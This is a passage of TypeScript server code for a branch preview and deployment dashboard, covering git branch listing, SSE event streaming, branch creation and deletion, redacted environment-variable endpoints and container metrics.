    if (bar) return `${bar[1]} ${bar[4]}%  (${bar[2]}/${bar[3]})`;
    // "writing db.col to ..."
    const writing = trimmed.match(/writing\s+([^\s]+)\s+to/);
    if (writing) return `写入 ${writing[1]}...`;
    // "done dumping db.col (N documents)"
    const doneDump = trimmed.match(/done dumping\s+([^\s]+)\s+\((\d+)\s+documents?\)/);
    if (doneDump) return `✓ 导出 ${doneDump[1]} (${doneDump[2]})`;
    // "finished restoring db.col (N documents, 0 failures)"
    const doneRestore = trimmed.match(/finished restoring\s+([^\s]+)\s+\((\d+)\s+documents?/);
    if (doneRestore) return `✓ 导入 ${doneRestore[1]} (${doneRestore[2]})`;
    // "preparing collections to restore from"
    if (trimmed.includes('preparing collections')) return '准备还原集合...';
    // Error-ish lines
    if (/error|failed|fatal/i.test(trimmed)) return trimmed.slice(0, 200);
    return null;
  }

  /**
   * Build the SSH command prefix used to run mongodump/mongorestore on a
   * remote jump host. The resulting array starts with 'ssh' and ends with
   * the username@host argument, ready to be appended with the remote shell
   * command as the last argv item.
   */
  function buildSshBase(tunnel: NonNullable<MongoConnectionConfig['sshTunnel']>): string[] {
    const args = [
      '-o', 'BatchMode=yes',
      '-o', 'StrictHostKeyChecking=no',
      '-o', 'UserKnownHostsFile=/dev/null',
      '-o', 'ConnectTimeout=10',
      // Keepalive: critical for long dumps — send a probe every 30s, tolerate 10 misses.
      '-o', 'ServerAliveInterval=30',
      '-o', 'ServerAliveCountMax=10',
      '-o', 'TCPKeepAlive=yes',
      '-p', String(tunnel.port || 22),
    ];
    if (tunnel.privateKeyPath) args.unshift('-i', tunnel.privateKeyPath);
    args.push(`${tunnel.username}@${tunnel.host}`);
    return args;
  }

  /**
   * Shell-quote a single argument (single-quote style, safe for POSIX sh).
   */
  function shq(s: string): string {
    return `'${String(s).replace(/'/g, `'"'"'`)}'`;
  }

  /**
   * Build the remote command string for mongodump/mongorestore over SSH,
   * optionally wrapped in `docker exec <container> sh -c ...`.
   */
  function buildRemoteMongoCmd(
    tool: 'mongodump' | 'mongorestore',
    args: string[],
    dockerContainer: string | undefined,
  ): string {
    const inner = [tool, ...args.map(shq)].join(' ');
    if (dockerContainer) {
      // docker exec -i for restore (stdin), no -i for dump
      const flags = tool === 'mongorestore' ? '-i' : '';
      return `docker exec ${flags} ${shq(dockerContainer)} sh -c ${shq(inner)}`.replace(/  +/g, ' ');
    }
    return inner;
  }

  // ── Remote branches ──
  //
  // Behavior (2026-04-30, 防"加载分支与远程引用"卡 30s):
  //   - `git fetch origin --prune` 每个 repoRoot 独立 cache 5 分钟
  //   - 5 分钟内只跑 `for-each-ref`(纯本地读 refs,毫秒级)
  //   - `?nofetch=true` 强制跳过 fetch,纯本地读(用户主动刷新前置场景)
  //   - 响应额外字段 `cachedAt`、`fetched` 让前端能展示"上次同步于 N 分钟前"

  const REMOTE_FETCH_CACHE_MS = 5 * 60 * 1000;
  const remoteFetchCache = new Map<string, number>(); // repoRoot → lastFetchedAt

  router.get('/remote-branches', async (req, res) => {
    try {
      const projectId = typeof req.query.project === 'string' ? req.query.project : null;
      const noFetch = req.query.nofetch === 'true' || req.query.nofetch === '1';
      const repoRoot = projectId
        ? stateService.getProjectRepoRoot(projectId, config.repoRoot)
        : config.repoRoot;

      const now = Date.now();
      const lastFetchedAt = remoteFetchCache.get(repoRoot) || 0;
      const cacheValid = now - lastFetchedAt < REMOTE_FETCH_CACHE_MS;

      let fetched = false;
      if (!noFetch && !cacheValid) {
        await shell.exec(
          'GIT_TERMINAL_PROMPT=0 git fetch origin --prune',
          { cwd: repoRoot, timeout: 30_000 },
        );
        remoteFetchCache.set(repoRoot, now);
        fetched = true;
      }

      const SEP = '<SEP>';
      const format = [
        '%(refname:lstrip=3)', '%(committerdate:iso8601)',
        '%(authorname)', '%(subject)',
      ].join(SEP);

      const result = await shell.exec(
        `git for-each-ref --sort=-committerdate --format="${format}" refs/remotes/origin`,
        { cwd: repoRoot },
      );

      const branches = result.stdout
        .trim()
        .split('\n')
        .filter(Boolean)
        .map(line => {
          const [name, date, author, subject] = line.split(SEP);
          return { name, date, author, subject };
        })
        .filter(b => b.name !== 'HEAD');

      res.json({
        branches,
        fetched,
        cachedAt: cacheValid ? lastFetchedAt : (fetched ? now : null),
      });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Branches CRUD ──

  // Live UI stream — 2026-04-19.
  //
  // Dashboards subscribe to this SSE once on page load. We emit:
  //   - event: snapshot         (initial full branch list, for late joiners)
  //   - event: branch.created   (GitHub webhook or manual add)
  //   - event: branch.updated   (commit SHA refresh, favorite/tag/notes change)
  //   - event: branch.status    (idle → building → running/error)
  //   - event: branch.removed   (delete from any path)
  //   - event: branch.deploy-step (per step of ongoing deploy)
  //   - :keepalive every 10s    (prevents proxy idle timeout)
  //
  // No auth differentiation — the dashboard was already authenticated to
  // get HERE; the stream just mirrors the same data a GET /branches would
  // return. Optional ?project= filters events to a single project so a
  // Dashboard opened on one project doesn't animate for another project's
  // push (prevents cross-project noise).
  //
  // server-authority rule: client disconnect does NOT cancel any backend
  // work; only the listener handle is detached.
  router.get('/branches/stream', (req, res) => {
    const projectFilter = typeof req.query.project === 'string' && req.query.project
      ? req.query.project
      : null;

    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      Connection: 'keep-alive',
      'X-Accel-Buffering': 'no',
    });

    const safeSend = (event: string, data: unknown) => {
      try { res.write(`event: ${event}\ndata: ${JSON.stringify(data)}\n\n`); }
      catch { /* client gone */ }
    };

    // Helper: filter events that belong to a different project. Every
    // payload may carry projectId or branch.projectId; events missing a
    // projectId (legacy / global) always pass through.
    const eventMatchesFilter = (type: string, payload: any): boolean => {
      if (!projectFilter) return true;
      if (type === 'branch.created') return !payload.branch?.projectId || payload.branch.projectId === projectFilter;
      if ('projectId' in (payload || {})) return !payload.projectId || payload.projectId === projectFilter;
      return true;
    };

    // Initial snapshot — the dashboard can populate its list without
    // waiting for the first event. Also acts as a liveness confirmation
    // so the client knows the stream is alive even when nothing's
    // happening upstream.
    const all = stateService.getAllBranches();
    const snapshot = projectFilter
      ? all.filter((b) => (b.projectId || 'default') === projectFilter)
      : all;
    for (const branch of snapshot) reconcileBranchStatus(branch);
    safeSend('snapshot', { branches: snapshot, ts: nowIso() });

    // Subscribe to the 'any' channel so we get one envelope per emit
    // with {type, payload} and can route with a single listener.
    const anyHandler = (envelope: any) => {
      if (!envelope || !envelope.type) return;
      if (!eventMatchesFilter(envelope.type, envelope.payload)) return;
      safeSend(envelope.type, envelope.payload);
    };
    branchEvents.on('any', anyHandler);

    const keepalive = setInterval(() => {
      try { res.write(':keepalive\n\n'); } catch { /* noop */ }
    }, 10_000);

    // Detach on client close — does NOT cancel any backend work.
    req.on('close', () => {
      clearInterval(keepalive);
      branchEvents.off('any', anyHandler);
    });
  });

  router.get('/branches', async (req, res) => {
    const state = stateService.getState();
    // P4 Part 3b: optional ?project=<id> filter. When absent or set to
    // 'default', pre-P4 behavior is preserved (every branch rolls up
    // because all legacy branches were migrated to projectId='default'
    // in migrateProjectScoping).
    const projectFilter = typeof req.query.project === 'string' ? req.query.project : null;
    const branches = Object.values(state.branches).filter(
      (b) => !projectFilter || (b.projectId || 'default') === projectFilter,
    );

    // Batch-reconcile container status (perf fix, 2026-05-03):
    // Old code did `containerService.isRunning(svc.containerName)` sequentially
    // for every (branch × service) tuple — N×M `docker inspect` calls,
    // ~50–150 ms each. With ~20 branches × 5 services that is 5+ seconds of
    // wall-clock latency on every page load, which is what users were seeing
    // as "加载项目与本地分支列表" sitting forever.
    //
    // New: one `docker ps --format {{.Names}}` call up front, then per-service
    // membership check is O(1) against the set. Single docker round-trip
    // regardless of project size.
    const runningNames = await containerService.getRunningContainerNames();
    for (const b of branches) {
      for (const [profileId, svc] of Object.entries(b.services)) {
        if (svc.status === 'running' && !runningNames.has(svc.containerName)) {
          svc.status = 'stopped';
          b.services[profileId] = svc;
        }
      }
      // Update overall status
      reconcileBranchStatus(b);
    }
    stateService.save();

    // Fetch latest commit subject + short SHA for each branch + 计算 v3 previewSlug
    // 让 dashboard 前端不再自己拼 URL（避免又出现"代码改了文档没跟上"），
    // 公式由 cds/src/services/preview-slug.ts 唯一控制。
    const branchesWithSubject = await Promise.all(
      branches.map(async (b) => {
        const project = b.projectId ? stateService.getProject(b.projectId) : undefined;
        const projectSlug = project?.slug || b.projectId || '';
        const previewSlug = b.branch && projectSlug
          ? computePreviewSlug(b.branch, projectSlug)
          : b.id;
        try {
          const result = await shell.exec(
            'git log -1 --format=%h%n%s',
            { cwd: b.worktreePath, timeout: 5000 },
          );
          const lines = result.stdout.trim().split('\n');
          return { ...b, commitSha: lines[0] || '', subject: lines[1] || '', previewSlug };
        } catch {
          return { ...b, commitSha: '', subject: '', previewSlug };
        }
      }),
    );

    // Sort: favorites first, then by creation date
    branchesWithSubject.sort((a, b) => {
      const fa = a.isFavorite ? 1 : 0;
      const fb = b.isFavorite ? 1 : 0;
      if (fa !== fb) return fb - fa;
      return 0; // preserve original order
    });

    // Compute container capacity: (memoryGB - 1) * 2
    // maxContainers is the global server limit, so runningContainers must also
    // count ALL projects — not just the project-filtered `branches` above.
    // Otherwise a multi-project setup shows "181/186" for project A even when
    // project B has 10 additional containers running (actual free = 171/186).
    const totalMemGB = Math.round(os.totalmem() / (1024 * 1024 * 1024));
    const maxContainers = Math.max(2, (totalMemGB - 1) * 2);
    let runningContainers = 0;
    for (const b of Object.values(state.branches)) {
      for (const svc of Object.values(b.services)) {
        if (svc.status === 'running' || svc.status === 'building' || svc.status === 'starting') {
          runningContainers++;
        }
      }
    }

    res.json({
      branches: branchesWithSubject,
      defaultBranch: state.defaultBranch,
      capacity: { maxContainers, runningContainers, totalMemGB },
      tabTitleEnabled: stateService.isTabTitleEnabled(),
    });
  });

  router.post('/branches', async (req, res) => {
    try {
      const { branch, projectId } = req.body as { branch?: string; projectId?: string };
      if (!branch) {
        res.status(400).json({ error: '分支名称不能为空' });
        return;
      }

      // P4 Part 3b: if the Dashboard passes projectId in the body, stamp
      // it on the new branch so project-scoped list queries can find it.
      // Missing value → defaults to 'default' in addBranch().
      const effectiveProjectId = projectId && typeof projectId === 'string' ? projectId : 'default';
      // Enforce: a project-scoped Agent Key may only touch its own project.
      const akMismatch = assertProjectAccess(req as any, effectiveProjectId);
      if (akMismatch) {
        res.status(akMismatch.status).json(akMismatch.body);
        return;
      }
      // Validate the project exists so we don't create orphans.
      const targetProject = stateService.getProject(effectiveProjectId);
      if (!targetProject) {
        res.status(400).json({ error: `未知项目: ${effectiveProjectId}` });
        return;
      }

      // Branch ID scoping: legacy default keeps the bare slugified name
      // for back-compat (existing URLs, saved links). Non-legacy
      // projects auto-prefix with the project slug so two projects can
      // each register "main" without colliding — this matches the
      // already-scoped worktree layout below. The preview domain still
      // resolves via `<branchId>.miduo.org`, no extra subdomain config.
      const slugified = StateService.slugify(branch);
      const id = targetProject.legacyFlag
        ? slugified
        : `${targetProject.slug}-${slugified}`;
      // Collide on the computed id (same-project same-name in the current
      // formula) OR on the (projectId, branch) tuple — the latter catches
      // projects whose `legacyFlag` flipped after an existing branch was
      // stored under the previous formula, so we don't spawn a phantom
      // duplicate (e.g. legacy `main` + new-format `prd-agent-main` for
      // the same git branch). See .claude/rules/snapshot-fallback.md.
      const existingById = stateService.getBranch(id);
      const existingByTuple = existingById
        ? undefined
        : stateService.findBranchByProjectAndName(effectiveProjectId, branch);
      if (existingById || existingByTuple) {
        const collidingId = existingById?.id ?? existingByTuple!.id;
        res.status(409).json({ error: `分支 "${collidingId}" 已存在` });
        return;
      }

      // P4 Part 18 (G1.5): refuse deploy if the project's clone isn't
      // ready yet. Legacy projects (no cloneStatus at all) pass
      // through because they use config.repoRoot via the fallback in
      // getProjectRepoRoot — there's nothing to clone. Only G1
      // projects with an explicit cloneStatus hit this guard.
      if (targetProject.cloneStatus && targetProject.cloneStatus !== 'ready') {
        const statusMsg: Record<string, string> = {
          pending: '项目尚未开始克隆。请先 POST /api/projects/' + effectiveProjectId + '/clone',
          cloning: '项目正在克隆中，请等待完成后重试。',
          error: '项目上次克隆失败，请先重试克隆：' + (targetProject.cloneError || '未知错误'),
        };
        res.status(409).json({
          error: 'project_not_ready',
          cloneStatus: targetProject.cloneStatus,
          message: statusMsg[targetProject.cloneStatus] || `项目克隆状态异常: ${targetProject.cloneStatus}`,
        });
        return;
      }
      // G1.5 补充: 项目配置了独立 gitRepoUrl 但从未克隆（cloneStatus 为
      // undefined 说明 reposBase 未设置，willClone=false）。如果放行，
      // getProjectRepoRoot 会静默回退到 config.repoRoot，创建出错误仓库的
      // worktree。这里主动拦截，提示用户先配置 CDS_REPOS_BASE 再克隆。
      if (targetProject.gitRepoUrl && !targetProject.repoPath && !targetProject.cloneStatus) {
        res.status(409).json({
          error: 'project_repo_not_cloned',
          message: `项目配置了独立仓库（${targetProject.gitRepoUrl}），但尚未克隆。` +
            `请确保服务器已设置 CDS_REPOS_BASE 环境变量，然后通过项目设置触发克隆（POST /api/projects/${effectiveProjectId}/clone）。`,
        });
        return;
      }

      // P4 Part 18 (G1.2): resolve the git repo root for the target
      // project. Legacy 'default' projects (and any project without a
      // cloned repoPath) fall back to the globally-mounted repoRoot.
      const branchRepoRoot = stateService.getProjectRepoRoot(effectiveProjectId, config.repoRoot);
      // FU-04: nested worktree layout — `<base>/<projectId>/<slug>`.
      // Two projects sharing a branch name (e.g. "main") get their
      // own subdirectories instead of colliding.
      const worktreePath = WorktreeService.worktreePathFor(config.worktreeBase, effectiveProjectId, id);
      await shell.exec(`mkdir -p "${path.posix.dirname(worktreePath)}"`);
      await worktreeService.create(branchRepoRoot, branch, worktreePath);

      const entry: BranchEntry = {
        id,
        projectId: effectiveProjectId,
        branch,
        worktreePath,
        services: {},
        status: 'idle',
        createdAt: new Date().toISOString(),
      };
      stateService.addBranch(entry);
      // Phase 8 — 新分支自动继承项目级 defaultEnv → 写入项目级 customEnv。
      //
      // Bugbot fix(PR #521 第九轮 Bug 3)— 写回项目级 scope(撤回第八轮误改)。
      // deploy 时容器读的是 getCustomEnv(projectId),不会读 branch-scope env,
      // 写到 entry.id(branch-scope)的值实际不会被部署消费,等于白写。
      // 项目级 env 由所有分支共享,这里仅在"项目级尚无该 key"时补一次,
      // idempotent — 不会覆盖用户在项目设置里手填的值,也不会污染其它分支。
      //
      // 跨分支隔离由 db-scope-isolation.ts 的 PER_BRANCH_DB_ENV_KEYS 名单
      // 单独负责(MySQL/Postgres DB 名按分支后缀化),不靠这里的 scope 选择。
      const defaultEnv = stateService.getDefaultEnv(effectiveProjectId);
      if (Object.keys(defaultEnv).length > 0) {
        const existingProjectEnv = stateService.getCustomEnvScope(effectiveProjectId);
        for (const [k, v] of Object.entries(defaultEnv)) {
          if (!(k in existingProjectEnv) && v) {
            stateService.setCustomEnvVar(k, v, effectiveProjectId);
          }
        }
      }
      stateService.save();

      // Live UI: notify open dashboards that a branch just got added
      // manually so their card list animates in without a page refresh.
      branchEvents.emitEvent({
        type: 'branch.created',
        payload: { branch: entry, source: 'manual', ts: nowIso() },
      });

      res.status(201).json({ branch: entry });
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Branch detail (GET /branches/:id) ──
  //
  // F9 fix (2026-05-02 onboarding UAT): the React dashboard's "Branch panel"
  // page tried to fetch `GET /api/branches/<id>` for a single-branch view but
  // CDS only exposed list / sub-resource endpoints (`GET /branches`,
  // `GET /branches/:id/logs`, etc.). Express returned the static
  // `/index.html` fallback as HTML, which the React loader interpreted as
  // an opaque success → blank panel. Now we return a typed JSON envelope
  // so the panel can render or 404 explicitly.
  //
  // Auth: respects the same project-key scope guard as the list endpoint —
  // a key minted for project A cannot peek into branches of project B even
  // if it knows the id. Bootstrap key + cookie auth pass through unchanged.
  //
  // IMPORTANT: this route must stay below the literal-path routes
  // `GET /branches/stream` (953) and `GET /branches` (1011) so Express
  // resolves them first. Sub-resource routes like `GET /branches/:id/logs`
  // use a different method+path so do not conflict.
  router.get('/branches/:id', (req, res) => {
    const { id } = req.params;
    const branch = stateService.getBranch(id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const m = assertProjectAccess(req as any, branch.projectId || 'default');
    if (m) {
      res.status(m.status).json(m.body);
      return;
    }
    res.json({ branch });
  });

  // GET /api/branches/:id/effective-env — 该分支在 deploy 时真正生效的环境变量(Phase A)
  //
  // 用户反馈(2026-05-04):「分支详情抽屉里的『变量』tab 还没做」。这个端点把
  // getMergedEnv() 的结果按来源分类返回,前端可以按「来源 chip」过滤:
  //   - cds-builtin: CDS_HOST / CDS_PROJECT_SLUG 等系统注入,只读不可改
  //   - mirror:      镜像加速变量(NPM_REGISTRY 等),开关在 CDS 系统设置
  //   - global:      _global scope customEnv,所有项目共享
  //   - project:     当前项目的 customEnv,只影响这个项目
  //
  // **敏感值默认 redact**(显示 `••••<最后4位>`),前端单条「显示值」按钮按需
  // 解锁(同 Vercel/Railway 行为)。判定走 env-classifier 的 SECRET_KEY_PATTERNS。
  //
  // 注意:目前没有 per-branch override(BranchEntry.customEnv 字段不存在),
  // 所以这个端点其实是 project + global merged。如果以后加 per-branch override,
  // 在 source 枚举里加 'branch' 即可,merged 优先级 branch > project > global > builtin。
  // EnvEntry / merge 逻辑 — list 端点和 reveal 端点共享,Bugbot PR #524 第四轮
  // 反馈:两个端点合并优先级各写一份容易漂移(实际审下来是一致的,但 future-
  // proof 的做法是抽到一处)。
  type _EnvEntry = {
    key: string;
    value: string;
    source: 'cds-builtin' | 'cds-derived' | 'mirror' | 'global' | 'project';
    isSecret: boolean;
  };
  const _SECRET_PATTERNS = [
    'PASSWORD', 'SECRET', 'TOKEN', 'API_KEY', 'APIKEY', 'ACCESS_KEY',
    'PRIVATE_KEY', 'OAUTH', 'STRIPE', 'TWILIO', 'SENDGRID', 'MAILGUN',
    'AWS_ACCESS', 'AWS_SECRET', 'CREDENTIAL',
  ];
  const _isSecretKey = (key: string): boolean => {
    const u = key.toUpperCase();
    return _SECRET_PATTERNS.some((p) => u.includes(p));
  };
  // 合并优先级和 deploy 路径完全一致(getMergedEnv):
  // builtin < mirror < cds-derived < global(只对未被 project 覆盖的 key 生效) < project
  const buildBranchEnvMap = (projectId: string): Map<string, _EnvEntry> => {
    const cdsEnv = stateService.getCdsEnvVars(projectId);
    const mirrorEnv = stateService.getMirrorEnvVars();
    const project = stateService.getProject(projectId);
    const builtinDerived: Record<string, string> = {};
    if (project) {
      builtinDerived.CDS_PROJECT_ID = project.id;
      builtinDerived.CDS_PROJECT_SLUG = project.slug;
    }
    const rawGlobal = stateService.getCustomEnvScope('_global');
    const rawProjectScoped = projectId === '_global'
      ? {}
      : stateService.getCustomEnvScope(projectId);
    const projectOnlyKeys = new Set(Object.keys(rawProjectScoped));
    const globalOnlyKeys = new Set(Object.keys(rawGlobal).filter((k) => !projectOnlyKeys.has(k)));

    const merged = new Map<string, _EnvEntry>();
    for (const [k, v] of Object.entries(cdsEnv)) {
      merged.set(k, { key: k, value: v, source: 'cds-builtin', isSecret: _isSecretKey(k) });
    }
    for (const [k, v] of Object.entries(mirrorEnv)) {
      merged.set(k, { key: k, value: v, source: 'mirror', isSecret: _isSecretKey(k) });
    }
    for (const [k, v] of Object.entries(builtinDerived)) {
      merged.set(k, { key: k, value: v, source: 'cds-derived', isSecret: false });
    }
    for (const k of globalOnlyKeys) {
      merged.set(k, { key: k, value: rawGlobal[k], source: 'global', isSecret: _isSecretKey(k) });
    }
    for (const [k, v] of Object.entries(rawProjectScoped)) {
      merged.set(k, { key: k, value: v, source: 'project', isSecret: _isSecretKey(k) });
    }
    return merged;
  };
  const _maskSecret = (v: string): string => {
    if (v.length > 4) return '••••' + v.slice(-4);
    return '••••';
  };

  router.get('/branches/:id/effective-env', (req, res) => {
    const { id } = req.params;
    const branch = stateService.getBranch(id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const m = assertProjectAccess(req as any, branch.projectId || 'default');
    if (m) {
      res.status(m.status).json(m.body);
      return;
    }

    const projectId = branch.projectId || 'default';
    const project = stateService.getProject(projectId);
    const merged = buildBranchEnvMap(projectId);

    // 排序:project > global > mirror > cds-derived > cds-builtin,
    // 让用户最关心的项目级排在最前。同 source 内 key 字典序。
    const sourceOrder: Record<_EnvEntry['source'], number> = {
      project: 0, global: 1, mirror: 2, 'cds-derived': 3, 'cds-builtin': 4,
    };
    const variables = Array.from(merged.values()).sort((a, b) => {
      const so = sourceOrder[a.source] - sourceOrder[b.source];
      if (so !== 0) return so;
      return a.key.localeCompare(b.key);
    });

    // 服务端 redact secret 值(Bugbot PR #524 反馈):之前 isSecret=true 的
    // 变量也以 plaintext 在 JSON 里返回,前端只是 display 时遮挡 → 浏览器
    // network tab / 截图 / 屏幕分享/ Activity Monitor 日志都能直接看见明文。
    // 改为:secret 变量 value 字段返回 '••••' + 末 4 位(短于 4 位则全 ••••),
    // 同时返 valueLength 让 UI 显示长度。真值通过单独的 reveal 端点按 key 取。
    const safeVariables = variables.map((v) => v.isSecret
      ? { ...v, value: _maskSecret(v.value), valueLength: v.value.length }
      : { ...v, valueLength: v.value.length });

    res.json({
      branchId: branch.id,
      projectId,
      projectSlug: project?.slug || projectId,
      total: safeVariables.length,
      bySource: {
        project: safeVariables.filter((v) => v.source === 'project').length,
        global: safeVariables.filter((v) => v.source === 'global').length,
        mirror: safeVariables.filter((v) => v.source === 'mirror').length,
        'cds-derived': safeVariables.filter((v) => v.source === 'cds-derived').length,
        'cds-builtin': safeVariables.filter((v) => v.source === 'cds-builtin').length,
      },
      variables: safeVariables,
    });
  });

  // GET /api/branches/:id/effective-env/reveal?key=<KEY>
  //
  // 单条 secret 取明文,与 /effective-env 的 redact 模式配套。前端 Reveal 眼睛
  // 按钮 / Copy 按钮用到原值时才 hit 这个端点。这样:
  //   1. 默认响应里没有明文 → 截图 / network tab 不再泄露
  //   2. 真正想看明文要单独触发,日志面板能更清晰记录"用户在 X 时间查看了 Y 变量"
  // 鉴权:GitHub/cookie auth + project-scoped agent key 隔离(assertProjectAccess)。
  // Bugbot PR #524 第四轮 High security:之前漏了 assertProjectAccess,
  // 项目 A 的 cdsp_xxx key 能 reveal 项目 B 的 secret 明文,绕过 redact 设计。
  router.get('/branches/:id/effective-env/reveal', (req, res) => {
    const { id } = req.params;
    const key = (req.query.key as string | undefined) || '';
    if (!key) {
      res.status(400).json({ error: 'missing query parameter "key"' });
      return;
    }
    const branch = stateService.getBranch(id);
    if (!branch) {
      res.status(404).json({ error: '分支不存在' });
      return;
    }
    const m = assertProjectAccess(req as any, branch.projectId || 'default');
    if (m) {
      res.status(m.status).json(m.body);
      return;
    }
    // 共用 list 端点的 merge 逻辑 — 保证两端 source 判定 100% 一致,Bugbot
    // 第四轮的"reveal 与 list 优先级可能漂移"顾虑由共享 builder 根除。
    const projectId = branch.projectId || 'default';
    const merged = buildBranchEnvMap(projectId);
    const entry = merged.get(key);
    if (!entry) {
      res.status(404).json({ error: '该分支生效环境里不存在此 key' });
      return;
    }
    res.json({ key, value: entry.value, source: entry.source });
  });

  // GET /api/branches/:id/metrics — 该分支所有 service 的 docker stats 瞬时值(Phase B)
  //
  // 用户反馈(2026-05-04):「想看 Railway 那种 CPU/内存 实时图」。这个端点返回
  // 每个 service 的 cpu% / mem(used+limit) / net(rx+tx) / blockIO,前端 5s 轮询,
  // 在前端维护 60-point ring buffer 画 5min 滚动 sparkline。
  //
  // 性能:一次 `docker stats --no-stream` 拿一个分支所有 service(典型 1-5 个),
  // ~300-800ms。比 N 次 docker inspect 快得多。--no-stream 让 docker 立即退出
  // 不进 streaming 模式。
  //
  // 注意:docker stats 拿不到已停止的容器,所以只对 services[].status === 'running'
  // 的 service 调。idle/stopped/error 的 service 在响应里 stats:null,UI 显示
  // dash 而不是 0(避免 0% 误导成"在跑但空闲")。
  router.get('/branches/:id/metrics', async (req, res) => {
    const { id } = req.params;
    const branch = stateService.getBranch(id);
    if (!branch) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    const m = assertProjectAccess(req as any, branch.projectId || 'default');
    if (m) {
      res.status(m.status).json(m.body);
      return;
    }

    const services = Object.entries(branch.services || {});
    const runningContainers = services
      .filter(([, svc]) => svc.status === 'running')
      .map(([, svc]) => svc.containerName);

    const statsMap = await containerService.getServiceStats(runningContainers);

    const result = services.map(([profileId, svc]) => ({
      profileId,
      containerName: svc.containerName,
      status: svc.status,
      stats: svc.status === 'running'
        ? (statsMap.get(svc.containerName) || null)
        : null,
    }));

    res.json({
      branchId: branch.id,
      ts: Date.now(),                   // 给 UI 算两点之间 delta 用(网络/IO 速率)
      services: result,
      runningCount: runningContainers.length,
      totalCount: services.length,
    });
  });

  router.delete('/branches/:id', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    // Project-key scope check: refuse if this branch belongs to a
    // different project than the one the key was minted for.
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }

    // ── Cluster-aware delete ──
    //
    // If the branch is owned by a remote executor, the master doesn't have
    // the worktree or containers locally — deleting locally would silently
    // succeed on master state while leaving the real worktree + containers
    // orphaned on the executor. Proxy the delete to the owning executor's
    // `/exec/delete` endpoint first, then drop master-side state.
    //
    // When proxying fails because the executor is offline, we still remove
    // the master-side state entry (the branch can't be recovered from here)
    // but emit an error step so the operator knows the remote worktree
    // may need manual cleanup.
    const remoteExecutor =
      entry.executorId && registry
        ? registry.getAll().find(n => n.id === entry.executorId && n.role !== 'embedded')
        : null;

    initSSE(res);
    try {
      if (remoteExecutor) {
        // Proxy to the executor's /exec/delete endpoint.
        sendSSE(res, 'step', {
          step: 'dispatch',
          status: 'running',
          title: `正在请求执行器 ${remoteExecutor.id} 删除分支...`,
        });

        const upstreamUrl = `http://${remoteExecutor.host}:${remoteExecutor.port}/exec/delete`;
        let proxied = false;
        try {
          const upstream = await fetch(upstreamUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              ...(config.executorToken ? { 'X-Executor-Token': config.executorToken } : {}),
            },
            body: JSON.stringify({ branchId: id }),
          });
          if (upstream.ok) {
            proxied = true;
            sendSSE(res, 'step', {
              step: 'dispatch',
              status: 'done',
              title: `执行器已删除分支 ${id}`,
            });
          } else {
            const errText = await upstream.text().catch(() => '');
            sendSSE(res, 'step', {
              step: 'dispatch',
              status: 'warning',
              title: `执行器拒绝删除 (HTTP ${upstream.status})，仍继续清理主节点状态`,
              log: errText.slice(0, 200),
            });
          }
        } catch (err) {
          sendSSE(res, 'step', {
            step: 'dispatch',
            status: 'warning',
            title: `无法连接执行器 ${remoteExecutor.id}，仍继续清理主节点状态`,
            log: (err as Error).message,
          });
        }

        // Drop master-side state unconditionally — if the executor is
        // unreachable, the operator can manually clean up on that node.
        stateService.removeLogs(id);
        stateService.removeBranch(id);
        stateService.save();

        branchEvents.emitEvent({
          type: 'branch.removed',
          payload: { branchId: id, projectId: entry.projectId, ts: nowIso() },
        });

        sendSSE(res, 'complete', {
          message: proxied
            ? `分支 "${id}" 已在执行器 ${remoteExecutor.id} 上删除`
            : `分支 "${id}" 已从主节点移除；执行器上的残留请手动检查`,
        });
        return;
      }

      // Local delete path (unchanged behavior)
      for (const svc of Object.values(entry.services)) {
        sendSSE(res, 'step', { step: 'stop', status: 'running', title: `正在停止 ${svc.containerName}...` });
        try { await containerService.stop(svc.containerName); } catch { /* ok */ }
        sendSSE(res, 'step', { step: 'stop', status: 'done', title: `已停止 ${svc.containerName}` });
      }

      // Remove worktree
      sendSSE(res, 'step', { step: 'worktree', status: 'running', title: '正在删除工作树...' });
      try {
        const repoRoot = stateService.getProjectRepoRoot(entry.projectId, config.repoRoot);
        await worktreeService.remove(repoRoot, entry.worktreePath);
      } catch { /* ok */ }
      sendSSE(res, 'step', { step: 'worktree', status: 'done', title: '工作树已删除' });

      stateService.removeLogs(id);
      stateService.removeBranch(id);
      stateService.save();

      branchEvents.emitEvent({
        type: 'branch.removed',
        payload: { branchId: id, projectId: entry.projectId, ts: nowIso() },
      });

      sendSSE(res, 'complete', { message: `分支 "${id}" 已删除` });
    } catch (err) {
      sendSSE(res, 'error', { message: (err as Error).message });
    } finally {
      res.end();
    }
  });

  // ── Pull latest code ──

  router.post('/branches/:id/pull', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    try {
      const result = await worktreeService.pull(entry.branch, entry.worktreePath);
      // PR_C.3: 计数 + activity log
      stateService.incrementBranchStat(id, 'pullCount');
      stateService.appendActivityLog(entry.projectId, {
        type: 'pull',
        branchId: id,
        branchName: entry.branch,
        actor: resolveActorForActivity(req),
      });
      stateService.save();
      res.json(result);
    } catch (err) {
      res.status(500).json({ error: (err as Error).message });
    }
  });

  // ── Build & Run (SSE stream) ──

  router.post('/branches/:id/deploy', async (req, res) => {
    const { id } = req.params;
    const entry = stateService.getBranch(id);
    if (!entry) {
      res.status(404).json({ error: `分支 "${id}" 不存在` });
      return;
    }
    {
      const m = assertProjectAccess(req as any, entry.projectId || 'default');
      if (m) { res.status(m.status).json(m.body); return; }
    }

    // P4 Part 18 (G1.5): same clone-ready guard as POST /branches.
    // Deploy uses worktree pull/create which would fail with a
    // cryptic git error if the target project's clone isn't ready.
    // Legacy branches (no projectId or legacy 'default') pass through.
    const deployProject = entry.projectId ? stateService.getProject(entry.projectId) : undefined;
